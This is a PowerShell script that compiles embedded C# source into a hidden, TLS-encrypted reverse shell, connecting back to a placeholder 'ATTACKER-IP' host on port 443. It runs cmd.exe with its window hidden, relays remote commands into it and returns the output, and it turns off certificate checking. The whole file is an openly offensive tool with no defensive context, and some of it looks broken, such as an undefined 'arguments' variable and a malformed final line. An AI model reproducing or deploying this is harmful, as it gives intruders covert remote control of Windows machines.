$Source = '
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using System.Security.Authentication;

namespace reverse
{
    class Program
    {
        static StreamWriter streamWriter;
        private static void Main(string[] args)
        {
            string host = 'ATTACKER-IP';
            int port = 443;
            string envvar = "";
            int xorkey = 1337;


            string envvar1 = "";
            for (int i = 0; i < envvar.Length; i++)
            {
                char c = (char)(envvar[i] ^ xorkey);
                envvar1 += c;
            }

            Console.WriteLine("executing {0} {3} and redirecting stdout / stderr to {1}:{2}", envvar1, host, port, arguments);

            using (TcpClient client = new TcpClient(host, port))
            {
                using (SslStream stream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateServerCertificate), null))
                {
                    stream.AuthenticateAsClient(host, null, SslProtocols.Tls12, false);
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);
                        StringBuilder strInput = new StringBuilder();
                        Process p = new Process();
                        //p.StartInfo.FileName = System.Environment.GetEnvironmentVariable(envvar1); 
                        p.StartInfo.FileName = "cmd.exe";
			p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.ErrorDataReceived += new DataReceivedEventHandler(CmdErrorDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();
                        p.BeginErrorReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            // 100% correct way of validating the cert.
            return true;
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception) { }
            }
        }

        private static void CmdErrorDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception) { }
            }
        }

    }
}'
Add-Type -TypeDefinition $Source -Language CSharp -IgnoreWarnings [reverse.Program]::Main('')